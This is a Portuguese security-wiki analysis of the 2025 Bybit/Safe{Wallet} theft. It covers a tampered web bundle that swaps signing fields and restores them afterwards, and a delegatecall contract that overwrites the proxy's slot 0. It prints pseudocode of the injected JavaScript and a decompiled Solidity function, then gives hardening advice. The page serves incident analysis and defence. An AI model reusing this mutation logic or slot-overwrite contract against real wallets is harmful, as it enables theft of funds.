# Comprometimento do fluxo de assinatura Web3 e takeover de proxy Safe Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Uma cadeia de roubo de cold-wallet combinou um **comprometimento da cadeia de fornecimento da interface web do Safe{Wallet}** com um **primitivo on-chain de delegatecall que sobrescreveu o ponteiro de implementação de um proxy (slot 0)**. As principais conclusões são:

- Se um dApp puder injetar código no fluxo de assinatura, ele poderá fazer com que um signatário produza uma **assinatura EIP-712 válida sobre campos escolhidos pelo atacante**, restaurando os dados originais da interface para que os demais signatários não percebam.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Os proxies Safe armazenam `masterCopy` (implementação) no **slot de armazenamento 0**. Um delegatecall para um contrato que grava no slot 0 efetivamente faz um “upgrade” do Safe para a lógica do atacante, concedendo controle total da carteira.<sup>[[3]](#references)</sup>

## Off-chain: mutação direcionada de assinatura no Safe{Wallet}

Um bundle do Safe adulterado (`_app-*.js`) atacava seletivamente endereços específicos de Safe + signatário. A lógica injetada era executada imediatamente antes da chamada de assinatura:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Propriedades do ataque
- **Context-gated**: allowlists codificadas para Safes/signers das vítimas impediram ruído e reduziram a detecção.<sup>[[1]](#references)[[3]](#references)</sup>
- **Mutação no último momento**: os campos (`to`, `data`, `operation`, gas) eram sobrescritos imediatamente antes de `signTransaction` e depois revertidos, fazendo com que os payloads das propostas na UI parecessem benignos, enquanto as assinaturas correspondiam ao payload do atacante.<sup>[[3]](#references)</sup>
- **Opacidade do EIP-712**: as wallets exibiam dados estruturados, mas não decodificavam calldata aninhada nem destacavam `operation = delegatecall`, fazendo com que a mensagem alterada fosse efetivamente assinada às cegas.<sup>[[3]](#references)[[4]](#references)</sup>

### Relevância da validação do Gateway
As propostas do Safe são enviadas ao **Safe Client Gateway**.<sup>[[5]](#references)</sup> Antes da implementação de verificações reforçadas, o gateway podia aceitar uma proposta em que `safeTxHash`/assinatura correspondessem a campos diferentes dos presentes no corpo JSON, caso a UI os reescrevesse após a assinatura. Após o incidente, o gateway passou a rejeitar propostas cujo hash/assinatura não correspondam à transação enviada.<sup>[[3]](#references)</sup> Uma verificação de hash semelhante no lado do servidor deve ser aplicada a qualquer API de orquestração de assinaturas.

### Destaques do incidente Bybit/Safe de 2025
- O esvaziamento da cold-wallet da Bybit em 21 de fevereiro de 2025 (~401k ETH) reutilizou o mesmo padrão: um bundle S3 comprometido do Safe só era ativado para signers da Bybit e alterava `operation=0` → `1`, apontando `to` para um contrato do atacante previamente implantado que escrevia no slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- O `_app-52c9031bfa03da47.js` armazenado em cache pelo Wayback mostra a lógica baseada no Safe da Bybit (`0x1db9…cf4`) e nos endereços dos signers, sendo então imediatamente revertida para um bundle limpo dois minutos após a execução, reproduzindo o truque de “mutar → assinar → restaurar”.<sup>[[1]](#references)[[2]](#references)</sup>
- O contrato malicioso (por exemplo, `0x9622…c7242`) continha funções simples `sweepETH/sweepERC20` e uma função `transfer(address,uint256)` que escrevia no implementation slot. A execução de `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` alterava a implementação do proxy e concedia controle total.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: takeover de proxy via Delegatecall por colisão de slots

Os proxies do Safe mantêm `masterCopy` no **storage slot 0** e delegam toda a lógica a ele. Como o Safe suporta **`operation = 1` (delegatecall)**, qualquer transação assinada pode apontar para um contrato arbitrário e executar seu código no contexto de storage do proxy.<sup>[[3]](#references)</sup>

Um contrato do atacante imitava um `transfer(address,uint256)` de ERC-20, mas, em vez disso, escrevia `_to` no slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Caminho de execução:<sup>[[1]](#references)[[3]](#references)</sup>
1. As vítimas assinam `execTransaction` com `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. O masterCopy do Safe valida as assinaturas sobre esses parâmetros.
3. O proxy executa um delegatecall em `attackerContract`; o corpo de `transfer` grava no slot 0.
4. O slot 0 (`masterCopy`) agora aponta para uma lógica controlada pelo atacante → **tomada total da wallet e drenagem dos fundos**.

### Observações sobre Guard & versão (hardening pós-incidente)
- Os transaction guards foram introduzidos no Safe v1.3.0 e podem inspecionar todos os parâmetros de `execTransaction` antes da execução; um guard pode rejeitar `delegatecall` ou aplicar uma policy ao destino e ao calldata. A Bybit usava a v1.1.1, anterior a esse hook.<sup>[[2]](#references)[[6]](#references)</sup>

## Checklist de detecção e hardening

- **Integridade da UI**: fixe os assets JS / SRI; monitore diffs do bundle; trate a signing UI como parte da trust boundary.
- **Validação no momento da assinatura**: hardware wallets com **EIP-712 clear-signing**; renderize explicitamente `operation` e faça o decode do calldata aninhado. Rejeite a assinatura quando `operation = 1`, a menos que a policy permita isso.<sup>[[3]](#references)</sup>
- **Verificações de hash no servidor**: gateways/services que fazem relay de proposals devem recalcular `safeTxHash` e validar se as assinaturas correspondem aos campos enviados.<sup>[[3]](#references)</sup>
- **Policy/allowlists**: regras de preflight para `to`, selectors e tipos de ativos, e bloqueio de delegatecall, exceto em flows examinados. Exija um policy service interno antes de fazer o broadcast de transações totalmente assinadas.
- **Design de contratos**: evite expor delegatecall arbitrário em wallets multisig/treasury, a menos que seja estritamente necessário. Trate qualquer implementation pointer como um upgrade primitive: proteja-o com access control explícito e faça guard dos alvos/selectors de delegatecall; mover o pointer para outro slot, por si só, não é uma defesa completa.<sup>[[3]](#references)[[6]](#references)</sup>
- **Monitoramento**: gere alertas para execuções de delegatecall a partir de wallets que mantêm fundos de treasury e para proposals que alterem `operation` em relação aos padrões comuns de `call`.

## References

- [1] [Análise forense da AnChain.AI sobre o exploit do Safe da Bybit](https://www.anchain.ai/blog/bybit)
- [2] [Análise da Zero Hour Technology sobre o comprometimento do bundle do Safe](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Análise técnica detalhada do hack da Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Changelog da smart account v1.3.0 do Safe (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
